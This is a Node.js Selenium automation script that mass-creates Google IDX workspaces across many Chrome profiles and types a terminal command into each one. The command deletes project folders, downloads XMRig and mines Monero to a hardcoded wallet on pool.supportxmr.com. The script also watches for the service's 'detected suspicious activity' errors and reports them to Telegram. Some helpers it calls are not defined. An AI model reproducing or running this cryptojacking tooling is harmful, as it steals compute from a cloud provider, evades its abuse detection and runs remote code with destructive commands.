const { fork } = require('child_process');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const { Builder, By, Key, until } = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');

const wait = (min, maxPlus) => new Promise(resolve => setTimeout(resolve, (min + maxPlus * Math.random()) * 1000))

/**
 * Opens a connection using Selenium WebDriver instead of Puppeteer
 * @param {number} port - The debugging port number of Chrome
 * @returns {Promise<{driver: WebDriver, mainTargetLinks: Array}>}
 */
const openSeleniumConnection = async (port) => {
    console.log(`Starting Selenium connection on port ${port}...`);

    // Configure Chrome options
    const options = new chrome.Options();
    options.debuggerAddress(`localhost:${port}`);
    options.addArguments('--disable-notifications');
    options.addArguments('--start-maximized');

    // Build WebDriver instance
    const driver = await new Builder()
        .forBrowser('chrome')
        .setChromeOptions(options)
        .build();

    try {
        // Navigate to the Google IDX page
        await driver.get('https://idx.google.com');
        console.log('Navigated to https://idx.google.com');

        // Wait for the page to load and main-target elements to be present
        await driver.wait(until.elementsLocated(By.css('.main-target')), 22000)
            .catch(() => {
                console.log('No .main-target elements found within timeout period');
                return { driver, mainTargetLinks: [] };
            });

        // Get list of links with class "main-target"
        const mainTargetElements = await driver.findElements(By.css('.main-target'));
        const mainTargetLinks = [];

        // Extract href attributes from found elements
        for (const element of mainTargetElements) {
            try {
                const href = await element.getAttribute('href');
                mainTargetLinks.push({ href });
            } catch (error) {
                console.error('Error getting href attribute:', error.message);
            }
        }

        console.log('Found <a> tags with main-target using Selenium:', mainTargetLinks);
        return { driver, mainTargetLinks };
    } catch (error) {
        console.error('Error in openSeleniumConnection:', error);
        return { driver, mainTargetLinks: [] };
    }
}

/**
 * Opens a new tab in Selenium driver and gets the main target links
 * @param {WebDriver} driver - Selenium WebDriver instance
 * @returns {Promise<{mainTargetLinks: Array}>}
 */
const getSeleniumPageLinks = async (driver) => {
    // Navigate to the Google IDX page
    await driver.get('https://idx.google.com');

    try {
        // Wait for the page to load and main-target elements to be present
        await driver.wait(until.elementsLocated(By.css('.main-target')), 22000)
            .catch(() => {
                console.log('No .main-target elements found within timeout period');
                return { mainTargetLinks: [] };
            });

        // Get list of links with class "main-target"
        const mainTargetElements = await driver.findElements(By.css('.main-target'));
        const mainTargetLinks = [];

        // Extract href attributes from found elements
        for (const element of mainTargetElements) {
            try {
                const href = await element.getAttribute('href');
                mainTargetLinks.push({ href });
            } catch (error) {
                console.error('Error getting href attribute:', error.message);
            }
        }

        console.log('Found <a> tags with main-target using Selenium:', mainTargetLinks);
        return { mainTargetLinks };
    } catch (error) {
        console.error('Error in getSeleniumPageLinks:', error);
        return { mainTargetLinks: [] };
    }
}


const openChrome = async (port, profilePath) => {
    let remoteDebugCmd = ''
    if (process.platform === 'win32') {
        const chromePath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
        // const profilePath = path.resolve(__dirname, 'profile', profile);
        remoteDebugCmd = `"${chromePath}" --remote-debugging-port=${port} --user-data-dir="${profilePath}"`;
    } else {
        const chromePath = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
        // const profilePath = path.join(__dirname, 'profile', profile);
        remoteDebugCmd = `"${chromePath}" --remote-debugging-port=${port} --user-data-dir="${profilePath}"`;
    }
    return new Promise((resolve, reject) => {
        console.log('Executing:', remoteDebugCmd);
        exec(remoteDebugCmd, (error) => {
            if (error) {
                console.error(`Error launching Chrome: ${error.message}`);
                reject(error);
            } else {
                console.log('Chrome launched with remote debugging');
                resolve();
            }
            console.log('Chrome launched with remote debugging');
        });
    });
}


/**
 * Run the job using Selenium WebDriver instead of Puppeteer
 * @param {number} port - Chrome debugging port
 * @param {string} name - Profile/machine name
 * @returns {Promise<void>}
 */
const runJobWithSelenium = async (port, name) => {
    let driver;
    try {
        // Connect to Chrome using Selenium
        const { driver: webDriver, mainTargetLinks } = await openSeleniumConnection(port);
        driver = webDriver;

        // Create additional projects if needed
        if (mainTargetLinks.length < 10) {//dnd_test
            for (let i = mainTargetLinks.length; i < 10; i++) {
                try {
                    // Navigate to the new project page
                    await driver.get('https://idx.google.com/new/react-native');

                    // Wait for and fill the input field
                    await driver.wait(until.elementLocated(By.css('#mat-input-0')), 30000);
                    await driver.findElement(By.css('#mat-input-0')).sendKeys(`${name}-w${i}-`);
                    await driver.findElement(By.css('#mat-input-0')).sendKeys('\uE007'); // Enter key

                    // Wait for iframe to load
                    await driver.wait(until.elementLocated(By.css('iframe.is-loaded')), 60000);

                    // No need to close this page, we'll navigate away
                    console.log(`Created new project ${name}-w${i}-`);
                } catch (error) {
                    console.log('Error creating new page with Selenium');
                    break;
                }
            }
        }

        // Get updated links after potentially creating new projects
        const { mainTargetLinks: listLinks } = await getSeleniumPageLinks(driver);
        listLinks.reverse();

        // Close all tabs except the current one (not directly supported in Selenium)
        // Instead, we can store the current window handle and close others
        const currentHandle = await driver.getWindowHandle();
        const allHandles = await driver.getAllWindowHandles();

        for (const handle of allHandles) {
            if (handle !== currentHandle) {
                await driver.switchTo().window(handle);
                await driver.close();
            }
        }

        await driver.switchTo().window(currentHandle);

        // Check for errors on the first link
        if (listLinks && listLinks.length > 0) {
            // Navigate to the first link
            const link = listLinks[0];
            await driver.get(link.href);

            // Check for errors (similar to checkDie function)
            try {
                console.log('Checking for errors on the page with Selenium...');
                await driver.wait(until.elementLocated(By.css('.error-section.callout.severity-error.is-loud')), 10000);

                // Get error message text
                const errorElement = await driver.findElement(By.css('.error-section.callout.severity-error.is-loud p'));
                const errorMessage = await errorElement.getText();

                if (errorMessage) {
                    console.log('Error message:', errorMessage);
                    if (errorMessage.includes('detected suspicious activity')) {
                        await saveErrProfile(path.join(__dirname, 'error_profile.txt'), `${name}_${port}`);
                    }

                    // Send Telegram message
                    await sendTelegramMessage(
                        TELEGRAM_BOT_TOKEN,
                        TELEGRAM_CHAT_ID,
                        `Máy #_${name}_# số ${+port - 9220} #tails${port} ⚠️ Error detected with Selenium::: ${errorMessage}`
                    );

                    throw new Error('Google fails (detected with Selenium)');
                }
            } catch (error) {
                if (error.name === 'TimeoutError') {
                    // No error found, which is good
                    console.log('No errors found on the page, continuing...');
                } else {
                    console.error('Error in checkDie with Selenium:', error);
                    throw error;
                }
            }

            // Process each link
            for (const link of listLinks) {
                try {
                    console.log('Resetting link with Selenium:', link.href);

                    // Get the worker name from the URL
                    const location = link.href.split('/');
                    const workerName = location[location.length - 1];

                    // Navigate to the link
                    await driver.get(link.href);

                    // Wait for iframe to load
                    await driver.wait(until.elementLocated(By.css('iframe.is-loaded')), 8 * 60 * 1000);

                    // Run commands
                    await runCMDWithSelenium(driver, workerName);

                    // Set a timer to close this after some time (not directly applicable in Selenium)
                    // We'll just proceed to the next link
                    console.log(`${workerName} done with Selenium`);

                    // Wait a bit before moving to the next link
                    await wait(5, 10);
                } catch (error) {
                    console.error('Error processing link with Selenium:', error);
                }
            }
        }

    } catch (error) {
        console.error('Error in runJobWithSelenium:', error);
    } finally {
        // Ensure driver is quit properly
        await driver.actions().sendKeys('\uE007').perform(); // Enter key
        await driver.actions().sendKeys('\uE007').perform(); // Enter key
        if (driver) {
            try {
                await driver.quit();
                console.log('Selenium WebDriver session closed');
            } catch (quitError) {
                console.error('Error closing Selenium WebDriver:', quitError);
            }
        }
    }
}

/**
 * Runs commands in a terminal using Selenium WebDriver
 * @param {WebDriver} driver - Selenium WebDriver instance
 * @param {string} name - The name to use in the command
 */
const runCMDWithSelenium = async (driver, name) => {
    try {
        console.log('Running command with Selenium...');
        await driver.wait(until.elementLocated(By.css('.the-iframe.is-loaded')), 30 * 1000);
        console.log('Pressed============');
        await wait(20, 3);
        console.log('Pressed============1');
        await driver.actions()
            .keyDown(Key.CONTROL)
            .sendKeys('`')
            .keyUp(Key.CONTROL)
            .perform();
        await driver.actions()
            .keyDown(Key.CONTROL)
            .sendKeys('c')
            .keyUp(Key.CONTROL)
            .perform();
        console.log('Pressed Control+C with Selenium');
        const commands = [
            "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2",
            " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
            " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
            " && cd xmrig-6.22.2",
            " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
        ];
        for (const cmd of commands) {
            await driver.actions().sendKeys(cmd).perform();
        }
        await driver.actions().sendKeys('\uE007').perform(); // Enter key
        console.log('Commands executed with Selenium');
        const cmd = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
        await driver.actions().sendKeys(cmd).perform();
        await driver.actions().sendKeys('\uE007').perform(); // Enter key
        // 
        await new Promise(resolve => setTimeout(resolve, 10 * 1000));
        console.log('Commands executed with Selenium');
        // await driver.switchTo().defaultContent();
    } catch (error) {
        console.error('Error in runCMDWithSelenium:', error);
    }
}


const runTerminal = (name, port, runPath) => {
    return new Promise((res, rej) => {
        const child = fork(runPath, [name, port]);
        child.on('close', (code) => {
            console.log(`close_________ ${code}`);
            res();
        });
        child.on('exit', (code) => {
            console.log(`exit__________ ${code}`);
            res();
        });
        child.on('message', (code) => {
            console.log(`message ${code}`);
        });
    });

}
const runAllProfile = async (machine, profilePath, runPath) => {
    try {
        await new Promise(resolve => setTimeout(resolve, 3 * 1000));
        const fileList = readDirectory(profilePath);
        for (const element of fileList) {
            try {
                const name = element.slice(-4);
                const count = +name - 9220;
                await runTerminal(`${machine}-p${count}`, count, runPath);
                await new Promise(resolve => setTimeout(resolve, 3 * 1000));
            } catch (error) {
                console.error('Error in runTerminal:', error);
            }
        }
    }
    catch (error) {
        console.error('Error in main:', error);
        await killChromeProcess().catch(console.error);
    }
}

function readDirectory(directoryPath) {
    console.log(`Reading files in: ${directoryPath}\n`);
    try {
        // Get all files and directories in the current directory
        const items = fs.readdirSync(directoryPath);

        items.forEach(item => {
            const itemPath = path.join(directoryPath, item);
            const stats = fs.statSync(itemPath);

            if (stats.isDirectory()) {
                console.log(`📁 Directory: ${item}`);
            } else {
                console.log(`📄 File: ${item} (${(stats.size / 1024).toFixed(2)} KB)`);
            }
        });

        return items;
    } catch (error) {
        console.error(`Error reading directory: ${error.message}`);
        return [];
    }
}

const killChromeProcess = (name) => {
    return new Promise((res, rej) => {
        if (process.platform === 'win32') {
            return exec('taskkill /IM chrome.exe /F', () => res());
        } else {
            return exec('killall "Google Chrome"', () => res());
        }
    })
};
module.exports = {
    openChrome,
    runCMDWithSelenium,
    runJobWithSelenium,
    runAllProfile,
    killChromeProcess,
}

